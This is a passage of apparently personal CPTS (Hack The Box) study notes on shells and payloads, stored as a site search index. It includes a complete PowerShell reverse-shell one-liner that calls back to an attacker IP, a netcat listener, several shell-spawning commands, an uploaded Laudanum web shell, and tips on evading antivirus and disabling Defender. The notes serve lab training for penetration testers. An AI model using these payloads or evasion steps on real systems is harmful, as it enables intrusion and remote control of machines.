exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template\n1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download\n2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution\n3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution\n</code></pre> We can drop into a system shell (shell) to gain access to the target system as if we were logged in and open a terminal.</p>"},{"location":"CPTS/Shells%20and%20Payloads/Infiltrating-Unix-Linux/#spawning-a-tty-shell-with-python","title":"Spawning a TTY Shell with Python","text":"<p>When we drop into the system shell, we notice that no prompt is present, yet we can still issue some system commands. This is a shell typically referred to as a <code>non-tty shell</code>. These shells have limited functionality and can often prevent our use of essential commands like su (switch user) and sudo (super user do), which we will likely need if we seek to escalate privileges. This happened because the payload was executed on the target by the apache user. Our session is established as the apache user. Normally, admins are not accessing the system as the apache user, so there is no need for a shell interpreter language to be defined in the environment variables associated with apache.</p> <p>We can manually spawn a TTY shell using Python if it is present on the system. We can always check for Python's presence on Linux systems by typing the command: which python. To spawn the TTY shell session using Python, we type the following command:</p>"},{"location":"CPTS/Shells%20and%20Payloads/Infiltrating-Unix-Linux/#interactive-python","title":"Interactive Python","text":"<p><pre><code>python -c 'import pty; pty.spawn(\"/bin/sh\")' \n\nsh-4.2$         \nsh-4.2$ whoami\nwhoami\napache\n</code></pre> This command uses python to import the pty module, then uses the pty.spawn function to execute the bourne shell binary (/bin/sh). We now have a prompt (sh-4.2$) and access to more system commands to move about the system as we please.</p>"},{"location":"CPTS/Shells%20and%20Payloads/Laudanum%2C%20One%20Webshell%20to%20Rule%20Them%20All/","title":"Laudanum, One Webshell to Rule Them All","text":""},{"location":"CPTS/Shells%20and%20Payloads/Laudanum%2C%20One%20Webshell%20to%20Rule%20Them%20All/#laudanum-one-webshell-to-rule-them-all","title":"Laudanum, One Webshell to Rule Them All","text":"<p>Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include asp, aspx, jsp, php, and more. This is a staple to have on any pentest. If you are using your own VM, Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it here. Let's examine Laudanum and see how it works.</p>"},{"location":"CPTS/Shells%20and%20Payloads/Laudanum%2C%20One%20Webshell%20to%20Rule%20Them%20All/#working-with-laudanum","title":"Working with Laudanum","text":"<p>The Laudanum files can be found in the /usr/share/laudanum directory. For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run. For specific files such as the shells, you must edit the file first to insert your attacking host IP address to ensure you can access the web shell or receive a callback in the instance that you use a reverse shell. Before using the different files, be sure to read the contents and comments to ensure you take the proper actions.</p>"},{"location":"CPTS/Shells%20and%20Payloads/Laudanum%2C%20One%20Webshell%20to%20Rule%20Them%20All/#laudanum-demonstration","title":"Laudanum Demonstration","text":"<p>Now that we understand what Laudanum is and how it works, let's look at a web application we have found in our lab environment and see if we can run a web shell. If you wish to follow along with this demonstration, you will need to add an entry into your /etc/hosts file on your attack VM or within Pwnbox for the host we are attacking. That entry should read:  status.inlanefreight.local. Once this is done, you can play and explore this demonstration as long as you are on the VPN or using Pwnbox."},{"location":"CPTS/Shells%20and%20Payloads/Laudanum%2C%20One%20Webshell%20to%20Rule%20Them%20All/#move-a-copy-for-modification","title":"Move a Copy for Modification","text":"<p><pre><code>sammyha@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx\n</code></pre> Add your IP address to the <code>allowedIps</code> variable on line 59. Make any other changes you wish. It can be prudent to remove the ASCII art and comments from the file. These items in a payload are often signatured on and can alert the defenders/AV to what you are doing.</p> <p></p> <p>We are taking advantage of the upload function at the bottom of the status page(Green Arrow) for this to work. Select your shell file and hit upload. If successful, it should print out the path to where the file was saved (Yellow Arrow). Use the upload function. Success prints out where the file went, navigate to it.  Once the upload is successful, you will need to navigate to your web shell to utilize its functions. The image below shows us how to do it. As seen from the last image, our shell was uploaded to the \\files\\ directory, and the name was kept the same. This won't always be the case. You may run into some implementations that randomize filenames on upload that do not have a public files directory or any number of other potential safeguards. For now, we are lucky that's not the case. With this particular web application, our file went to status.inlanefreight.local\\files\\demo.aspx and will require us to browse for the upload by using that \\ in the path instead of the / like normal. Once you do this, your browser will clean it up in your URL window to appear as status.inlanefreight.local//files/demo.aspx. </p> <p>We can now utilize the Laudanum shell we uploaded to issue commands to the host. We can see in the example that the systeminfo command was run. </p>"},{"location":"CPTS/Shells%20and%20Payloads/Payloads/","title":"Payloads","text":"<p>We have plenty of good options for dealing with generating payloads to use against Windows hosts. We touched on some of these already in previous sections. For example, the Metasploit-Framework and MSFVenom is a very handy way to generate payloads since it is OS agnostic. The table below lays out some of our options. However, this is not an exhaustive list, and new resources come out daily.</p>"},{"location":"CPTS/Shells%20and%20Payloads/Payloads/#common-payload-types","title":"Common Payload Types","text":"<ol> <li>DLLs: Inject malicious DLLs for privilege escalation or UAC bypass.</li> <li>Batch: Automate command execution with <code>.bat</code> files.</li> <li>VBS: Lightweight scripts for phishing or macro-based attacks.</li> <li>MSI: Use <code>.msi</code> files with <code>msiexec</code> for reverse shells or elevated access.</li> <li>PowerShell: Dynamic scripting for shell access and automation.</li> </ol>"},{"location":"CPTS/Shells%20and%20Payloads/Payloads/#basic-tactics","title":"Basic Tactics","text":"<ol> <li>Generate Payload: Use MSFVenom or other tools to create payloads.</li> <li>Obfuscate: Utilize tools like Darkarmour to evade AV detection.</li> <li>Transfer Payload: Transfer via HTTP servers (<code>python3 -m http.server</code>) or shared drives.</li> <li>Execute Payload: Deploy using system utilities (e.g., <code>msiexec</code>, PowerShell).</li> </ol> Resource Description <code>MSFVenom &amp; Metasploit-Framework</code> Source\u00a0MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. <code>Payloads All The Things</code> Source\u00a0Here, you can find many different resources and cheat sheets for payload generation and general methodology. <code>Mythic C2 Framework</code> Source\u00a0The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation. <code>Nishang</code> Source\u00a0Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester. <code>Darkarmour</code> Source\u00a0Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts."},{"location":"CPTS/Shells%20and%20Payloads/Payloads/#payload-transfer-and-execution","title":"Payload Transfer and Execution","text":""},{"location":"CPTS/Shells%20and%20Payloads/Payloads/#common-payload-transfer-methods","title":"Common Payload Transfer Methods","text":"<ol> <li> <p>Impacket:</p> <ul> <li>Python-based toolset for interacting with network protocols.</li> <li>Key tools: <code>psexec</code>, <code>smbclient</code>, <code>wmi</code>, Kerberos, SMB server setup.</li> <li>GitHub</li> <li> <p>SMB (Server Message Block):</p> </li> <li> <p>Transfer payloads using SMB shares like <code>C$</code> or <code>admin$</code>.</p> </li> <li>Useful for domain-joined hosts with shared data.</li> <li> <p>Payloads All The Things:</p> </li> <li> <p>Resource for one-liners to transfer files quickly across hosts.</p> </li> <li>GitHub</li> <li> <p>Remote Execution via Metasploit:</p> </li> <li> <p>Automates payload building, staging, and execution.</p> </li> <li>Integrates into many exploit modules.</li> <li> <p>Other Protocols:</p> </li> <li> <p>FTP/TFTP/HTTP/HTTPS: Use available protocols for file uploads.</p> </li> <li>Enumerate open ports to find transfer options.</li> </ul> </li> </ol>"},{"location":"CPTS/Shells%20and%20Payloads/Payloads/#key-tactics","title":"Key Tactics","text":"<ul> <li>Use Impacket\u2019s SMB server for hosting payloads.</li> <li>Leverage MSF modules to streamline delivery and execution.</li> <li>Utilize SMB shares for payload hosting or data exfiltration.</li> <li>Focus on protocol enumeration to identify delivery opportunities.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/","title":"SpawningInteractiveShells","text":""},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#spawning-interactive-shells","title":"Spawning Interactive Shells","text":"<ul> <li> <p>Initial Shell:</p> <ul> <li>Often, the initial shell is limited (jail shell).</li> <li>Use Python to spawn a TTY Bourne shell for full command access and better usability.</li> <li> <p>Alternative Methods (If Python is not available):</p> </li> <li> <p>Utilize other binaries or methods to spawn an interactive shell.</p> </li> <li>Examples:<ul> <li><code>/bin/sh</code></li> <li><code>/bin/bash</code></li> <li>Other shell interpreter binaries present on the system.</li> </ul> </li> <li> <p>Common Shells:</p> </li> <li> <p>Bourne Shell (<code>/bin/sh</code>)</p> </li> <li>Bourne Again Shell (<code>/bin/bash</code>)</li> <li>These are often natively present on most Linux systems.</li> <li> <p>Practical Relevance:</p> </li> <li> <p>Encountered frequently on Hack The Box and real-world engagements.</p> </li> <li>Knowing multiple shell-spawning techniques is crucial for overcoming limitations.</li> </ul> </li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#binsh-i","title":"/bin/sh -i","text":"<p>This command will execute the shell interpreter specified in the path in interactive mode (-i). <pre><code>/bin/sh -i\nsh: no job control in this shell\nsh-4.2$\n</code></pre></p>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#perl","title":"Perl","text":"<p>If the programming language Perl is present on the system, these commands will execute the shell interpreter specified. <pre><code>perl \u2014e 'exec \"/bin/sh\";'\n</code></pre> <pre><code>perl: exec \"/bin/sh\";\n</code></pre> The command directly above should be run from a script.</p>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#ruby","title":"Ruby","text":"<p>If the programming language Ruby is present on the system, this command will execute the shell interpreter specified: <pre><code>ruby: exec \"/bin/sh\"\n</code></pre> The command directly above should be run from a script.</p>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#lua","title":"Lua","text":"<p>If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter specified using the full command below:</p>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#lua-to-shell","title":"Lua To Shell","text":"<p>Spawning Interactive Shells lua: os.execute('/bin/sh') The command directly above should be run from a script.</p>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#awk","title":"AWK","text":"<p>AWK is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. This is shown in the short awk script below:</p>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#awk-shell","title":"AWK Shell","text":"<pre><code>awk 'BEGIN {system(\"/bin/sh\")}'\n</code></pre>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#find","title":"Find","text":"<p>Find is a command present on most Unix/Linux systems widely used to search for &amp; through files and directories using various criteria. It can also be used to execute applications and invoke a shell interpreter.</p>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#using-find-for-a-shell","title":"Using Find For A Shell","text":"<p><pre><code>find / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\;\n</code></pre> This use of the find command is searching for any file listed after the -name option, then it executes awk (/bin/awk) and runs the same script we discussed in the awk section to execute a shell interpreter.</p>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#using-exec-to-launch-a-shell","title":"Using Exec To Launch A Shell","text":"<p><pre><code>find . -exec /bin/sh \\; -quit\n</code></pre> This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained.</p>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#vim","title":"VIM","text":"<p>Yes, we can set the shell interpreter language from within the popular command-line-based text-editor VIM. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.</p>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#vim-to-shell","title":"Vim To Shell","text":"<pre><code>vim -c ':!/bin/sh'\n</code></pre>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#vim-escape","title":"Vim Escape","text":"<pre><code>vim\n:set shell=/bin/sh\n:shell\n</code></pre>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#execution-permissions-considerations","title":"Execution Permissions Considerations","text":"<p>In addition to knowing about all the options listed above, we should be mindful of the permissions we have with the shell session's account. We can always attempt to run this command to list the file properties and permissions our account has over any given file or binary:</p>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#permission","title":"Permission","text":"<p><pre><code>ls -la &lt;path/to/fileorbinary&gt;\n</code></pre> We can also attempt to run this command to check what <code>sudo</code> permissions the account we landed on has:</p>"},{"location":"CPTS/Shells%20and%20Payloads/SpawningInteractiveShells/#sudo-l","title":"Sudo -l","text":"<p>The sudo -l command above will need a stable interactive shell to run. If you are not in a full shell or sitting in an unstable shell, you may not get any return from it. Not only will considering permissions allow us to see what commands we can execute, but it may also start to give us an idea of potential vectors that will allow us to escalate privileges.</p>"},{"location":"CPTS/Shells%20and%20Payloads/anatomy_of_a_shell/","title":"Anatomy of a shell","text":""},{"location":"CPTS/Shells%20and%20Payloads/anatomy_of_a_shell/#1-input-mechanism","title":"1. Input Mechanism","text":"<ul> <li>Definition: This is the interface through which the user provides commands or instructions to the shell.</li> <li>Examples:<ul> <li>Command-line prompt (<code>$</code>, <code>#</code>, <code>&gt;</code>).</li> <li>Graphical input (e.g., in graphical shells or specialized tools).</li> </ul> </li> <li>Role: It interprets user input and sends it to the underlying system for execution.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/anatomy_of_a_shell/#2-command-interpreter","title":"2. Command Interpreter","text":"<ul> <li>Definition: The core component of a shell that parses and interprets the commands provided by the user.</li> <li>Examples:<ul> <li>Bash: Interprets shell scripting syntax for Unix/Linux systems.</li> <li>PowerShell: Processes commands in Windows environments with support for object-oriented outputs.</li> <li>cmd.exe: Executes batch commands in Windows.</li> </ul> </li> <li>Role: It breaks down commands into executable parts, handles variables, and executes scripts or direct instructions.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/anatomy_of_a_shell/#3-environment-variables","title":"3. Environment Variables","text":"<ul> <li>Definition: A set of key-value pairs that store configuration and system information for the shell.</li> <li>Examples:<ul> <li><code>$PATH</code>: Specifies directories where executables are searched.</li> <li><code>$HOME</code>: Points to the user's home directory.</li> <li><code>$PS1</code>: Defines the shell prompt appearance.</li> </ul> </li> <li>Role: Enables customization, provides context for commands, and simplifies repetitive tasks.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/anatomy_of_a_shell/#4-built-in-commands-and-functions","title":"4. Built-in Commands and Functions","text":"<ul> <li>Definition: Commands and functionalities natively supported by the shell without requiring external binaries.</li> <li>Examples:<ul> <li><code>cd</code>: Change directory.</li> <li><code>echo</code>: Print output to the console.</li> <li><code>export</code>: Modify or create environment variables.</li> </ul> </li> <li>Role: Provides essential functions to interact with the filesystem, environment, and processes.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/anatomy_of_a_shell/#5-external-command-execution","title":"5. External Command Execution","text":"<ul> <li>Definition: The shell's ability to locate and execute binaries or programs outside its built-in capabilities.</li> <li>Examples:<ul> <li>Running <code>python</code> to execute a Python script.</li> <li>Invoking <code>ls</code> to list files in a directory.</li> </ul> </li> <li>Role: Extends the shell\u2019s capabilities by integrating with system tools and third-party software.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/anatomy_of_a_shell/#6-output-mechanism","title":"6. Output Mechanism","text":"<ul> <li>Definition: Displays the result of executed commands or scripts.</li> <li>Examples:<ul> <li>Standard output (<code>stdout</code>): Displays regular command output.</li> <li>Standard error (<code>stderr</code>): Displays error messages.</li> <li>Redirection (<code>&gt;</code>, <code>&gt;&gt;</code>): Directs output to files or other processes.</li> </ul> </li> <li>Role: Provides feedback to the user and enables integration with other tools or pipelines.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/anatomy_of_a_shell/#7-scripting-capabilities","title":"7. Scripting Capabilities","text":"<ul> <li>Definition: Support for scripting languages that automate tasks and execute complex workflows.</li> <li>Examples:<ul> <li>Shell scripts (<code>.sh</code> files in Bash).</li> <li>PowerShell scripts (<code>.ps1</code> files).</li> <li>Batch files (<code>.bat</code> files in cmd.exe).</li> </ul> </li> <li>Role: Enables task automation, system management, and complex programming within the shell environment.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/anatomy_of_a_shell/#8-security-features","title":"8. Security Features","text":"<ul> <li>Definition: Mechanisms to control user access, execution privileges, and system resource usage.</li> <li>Examples:<ul> <li>User permissions (e.g., <code>sudo</code> or <code>Administrator</code>).</li> <li>Execution policies (e.g., PowerShell's script execution policy).</li> <li>Logging and auditing of commands.</li> </ul> </li> <li>Role: Ensures proper usage and safeguards against unauthorized access or misuse.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/anatomy_of_a_shell/#9-interactivity-and-feedback","title":"9. Interactivity and Feedback","text":"<ul> <li>Definition: Features that enhance user experience and interaction with the shell.</li> <li>Examples:<ul> <li>Tab-completion for commands or filenames.</li> <li>Syntax highlighting in modern shells.</li> <li>Command history (<code>history</code> in Bash).</li> </ul> </li> <li>Role: Improves usability and efficiency during manual input and navigation.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/anatomy_of_a_shell/#10-networking-features-optional","title":"10. Networking Features (Optional)","text":"<ul> <li>Definition: Some shells incorporate networking utilities for communication and data transfer.</li> <li>Examples:<ul> <li><code>curl</code>, <code>wget</code> for downloading files.</li> <li><code>netcat</code> for creating sockets or transferring data.</li> </ul> </li> <li>Role: Enables remote operations, file transfers, and communication from within the shell.</li> </ul> <p>This anatomy provides a foundational understanding of what makes up a shell and its various functionalities, which are essential for interacting with and controlling computer systems.</p>"},{"location":"CPTS/Shells%20and%20Payloads/bind_shell/","title":"Bind shell","text":""},{"location":"CPTS/Shells%20and%20Payloads/bind_shell/#bind-shell","title":"Bind Shell","text":"<p>In many cases, we will be working to establish a shell on a system on a local or remote network. This means we will be looking to use the terminal emulator application on our local attack box to control the remote system through its shell. This is typically done by using a Bind &amp;/or Reverse shell.</p>"},{"location":"CPTS/Shells%20and%20Payloads/bind_shell/#what-is-it","title":"What Is It?","text":"<p>With a bind shell, the target system has a listener started and awaits a connection from a pentester's system (attack box).</p>"},{"location":"CPTS/Shells%20and%20Payloads/bind_shell/#bind-example","title":"Bind Example","text":"<p>As seen in the image, we would connect directly with the IP address and port listening on the target. There can be many challenges associated with getting a shell this way. Here are some to consider:</p> <ul> <li>There would have to be a listener already started on the target.</li> <li>If there is no listener started, we would need to find a way to make this happen.</li> <li>Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.</li> <li>Operating system firewalls (on Windows &amp; Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/","title":"Reverseshell","text":""},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#reverse-shell","title":"Reverse Shell","text":"<p>With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.</p> <p> Reverse shell cheat shee</p>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#why-reverse-shells-are-effective","title":"Why Reverse Shells are Effective","text":"<ul> <li>Admins often overlook outbound connections, increasing the chances of avoiding detection.</li> <li>Unlike bind shells, which rely on incoming connections (requiring open firewall ports), reverse shells initiate connections from the target to the attacker's machine.</li> <li>This makes reverse shells more practical in real-world scenarios where strict firewall rules are common.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#how-reverse-shells-work","title":"How Reverse Shells Work","text":"<ul> <li>Attack Box: Starts a listener to wait for an incoming connection.</li> <li>Target System: Initiates the connection to the attack box using a method such as:</li> <li>Unrestricted File Upload</li> <li>Command Injection</li> <li>Roles Reversed: The attack box becomes the server, and the target system acts as the client.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#using-pre-made-resources","title":"Using Pre-Made Resources","text":"<ul> <li>Reverse Shell Cheat Sheet: A valuable resource with:</li> <li>Commands and code for various reverse shell scenarios.</li> <li>Automated reverse shell generators for practice or engagements.</li> <li>Be Cautious:</li> <li>Admins may monitor and adapt to publicly known tools and repositories.</li> <li>Customization of payloads and attacks may be necessary to evade detection.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#practical-example-reverse-shell-on-windows","title":"Practical Example: Reverse Shell on Windows","text":"<ol> <li>Set Up a Listener: Start a Netcat listener on the attack box.</li> <li>Spawn the Reverse Shell: Use PowerShell code or another method to force the target to connect to the listener.</li> </ol> <pre><code>sudo nc -lvnp 443\n</code></pre>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#using-netcat-for-reverse-shells-and-port-considerations","title":"Using Netcat for Reverse Shells and Port Considerations","text":""},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#listener-setup","title":"Listener Setup","text":"<ul> <li>Command: <code>sudo nc -lvnp 443</code></li> <li>Port Selection: Port 443 is commonly used for HTTPS traffic.</li> <li>Choosing a common port like 443 increases the likelihood of bypassing OS and network firewalls.</li> <li>Outbound traffic on port 443 is rarely blocked since many applications rely on HTTPS.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#firewall-considerations","title":"Firewall Considerations","text":"<ul> <li>Standard Firewalls: Allow traffic based on ports and IP addresses, making port 443 effective for bypassing basic rules.</li> <li>Advanced Firewalls: Utilize deep packet inspection (DPI) and Layer 7 analysis to detect suspicious traffic, even on allowed ports.</li> <li>Evasion Techniques: Briefly covered in this module; detailed techniques will be addressed later.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#netcat-on-windows","title":"Netcat on Windows","text":"<ul> <li>Challenges:</li> <li>Netcat is not a native tool on Windows systems.</li> <li>Reliance on Netcat requires transferring the binary to the target, which may not always be feasible.</li> <li>Best Practice:</li> <li>Use tools and utilities already present on the target system (\"living off the land\") for better reliability and stealth.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#next-steps","title":"Next Steps","text":"<ul> <li>Spawn the reverse shell on the target.</li> <li>Use tools like RDP for further interactions.</li> <li>Experiment with transferring tools like Netcat to the target when native utilities are</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#what-applications-and-shell-languages-are-hosted-on-the-target","title":"What applications and shell languages are hosted on the target?","text":"<p>This is an excellent question to ask any time we are trying to establish a reverse shell. Let's use command prompt &amp; PowerShell to establish this simple reverse shell. We can use a standard PowerShell reverse shell one-liner to illustrate this point.</p> <p>On the Windows target, open a command prompt and copy &amp; paste this command:</p>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#client-target","title":"Client Target","text":"<pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#powershell-reverse-shell-payload","title":"PowerShell Reverse Shell Payload","text":""},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#overview","title":"Overview","text":"<p>This PowerShell one-liner establishes a reverse shell connection from the target to an attacker's machine. The payload uses PowerShell's capabilities to create a TCP client that communicates with the attacker's listener.</p>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#command-breakdown","title":"Command Breakdown","text":"<pre><code>powershell -nop -c \"...\"\n</code></pre> <ul> <li><code>-nop</code>: Runs PowerShell without the startup profile, reducing potential interference.</li> <li><code>-c</code>: Executes the command provided as a string.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#core-logic","title":"Core Logic","text":"<pre><code>$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);\n</code></pre> <ul> <li>Creates a TCP client to connect to the attacker's machine (<code>10.10.14.158</code>) on port <code>443</code>.</li> </ul> <pre><code>$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};\n</code></pre> <ul> <li>Opens a data stream for communication.</li> <li>Allocates a buffer array for reading incoming data.</li> </ul> <pre><code>while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n    $sendback = (iex $data 2&gt;&amp;1 | Out-String );\n    $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n    $stream.Write($sendbyte,0,$sendbyte.Length);\n    $stream.Flush();\n}\n</code></pre> <ul> <li>While Loop: Listens for commands from the attacker's machine.</li> <li><code>iex $data</code>: Executes received commands (potentially dangerous; executes untrusted input).</li> <li>Output Handling: Captures the output of the executed commands, appends the current directory, and sends the response back to the attacker.</li> <li>Data Transfer:</li> <li>Converts the output into ASCII-encoded bytes.</li> <li>Sends the data back through the TCP stream.</li> </ul> <pre><code>$client.Close();\n</code></pre> <ul> <li>Closes the TCP connection once the session ends.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#use-case","title":"Use Case","text":"<ul> <li>Establishes a reverse shell session, allowing remote command execution on the target system.</li> <li>Used in penetration testing to control a compromised system.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#caveats-detection","title":"Caveats &amp; Detection","text":"<ul> <li>Firewalls: Port 443 is typically allowed for outbound connections, bypassing many firewall rules.</li> <li>Security Tools:</li> <li>Modern endpoint detection and response (EDR) systems may flag PowerShell usage for reverse shells.</li> <li>Command obfuscation techniques can help evade detection.</li> <li>Execution Policy: The payload assumes PowerShell is permitted to run unrestricted scripts.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#listener-setup_1","title":"Listener Setup","text":"<ul> <li>Start a listener on the attacker's machine (e.g., <code>sudo nc -lvnp 443</code>) before executing the payload to receive the shell connection.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#improvement-opportunities","title":"Improvement Opportunities","text":"<ul> <li>Consider obfuscating the command to reduce detection.</li> <li>Test in controlled environments before using in real scenarios.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#what-happened-when-we-hit-enter-in-command-prompt","title":"What happened when we hit enter in command prompt?","text":"<p>The <code>Windows Defender antivirus (AV)</code> software stopped the execution of the code. This is working exactly as intended, and from a defensive perspective, this is a win. From an offensive standpoint, there are some obstacles to overcome if <code>AV</code> is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the <code>Virus &amp; threat protection</code> settings or by using this command in an administrative PowerShell console (right-click, run as admin):</p>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#disable-av","title":"Disable AV","text":"<pre><code>PS C:\\Users\\htb-student&gt; Set-MpPreference -DisableRealtimeMonitoring $true\n</code></pre> <p>Once the AV is disabled we can run the command.</p> <pre><code>sudo nc -lvnp 443\n</code></pre>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#calling-powershell","title":"Calling PowerShell","text":"<pre><code>powershell -nop -c\n</code></pre> <p>Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in cmd.exe.</p>"},{"location":"CPTS/Shells%20and%20Payloads/reverseshell/#binding-a-socket","title":"Binding A Socket","text":"<p><pre><code>\"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);\n</code></pre> Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses (10.10.14.158,443). The semi-colon (;) ensures the commands &amp; code are executed sequentially.</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/","title":"skillAssessment","text":""},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#the-live-engagement","title":"The Live Engagement","text":"<p>Here we are. It\u2019s the big day and time to start our engagement. We need to put our new skills with crafting and delivering payloads, acquiring and interacting with a shell on Windows and Linux, and how to take over a Web application to the test. Complete the objectives below to finish the engagement.</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#scenario","title":"Scenario:","text":"<p>CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your Pwnbox, we will need to RDP into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#objectives","title":"Objectives:","text":"<p>Demonstrate your knowledge of exploiting and receiving an interactive shell from a Windows host or server. Demonstrate your knowledge of exploiting and receiving an interactive shell from a Linux host or server. Demonstrate your knowledge of exploiting and receiving an interactive shell from a Web application. Demonstrate your ability to identify the shell environment you have access to as a user on the victim host. Complete the objectives by answering the challenge questions below.</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#credentials-and-other-needed-info","title":"Credentials and Other Needed Info:","text":"<p>Foothold: - IP: - Credentials: 